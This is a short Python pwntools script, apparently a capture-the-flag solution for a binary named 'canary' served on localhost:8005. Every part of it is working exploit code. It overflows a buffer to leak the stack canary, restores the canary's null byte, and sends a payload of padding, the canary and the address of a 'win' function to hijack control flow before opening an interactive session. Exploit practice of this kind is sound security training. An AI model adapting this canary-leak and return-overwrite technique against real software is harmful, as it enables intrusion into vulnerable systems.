#!/usr/bin/env python3

from pwn import *

exe = ELF("./canary")

context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p)
            pause()
    else:
        p = remote("localhost", 8005)

    return p


def main():
    p = conn()

    # good luck pwning :)
    p.send(b"a"*0x19)
    p.recvuntil(b"a"*0x19)

    canary = u64(p.recv(8))
    canary <<= 8
    canary &= 0xffffffffffffffff
    print(hex(canary))

    payload = flat(
        b"a"*0x18,
        canary,
        0xdeadbeef,
        exe.sym.win,
    )
    p.sendline(payload)

    p.interactive()


if __name__ == "__main__":
    main()
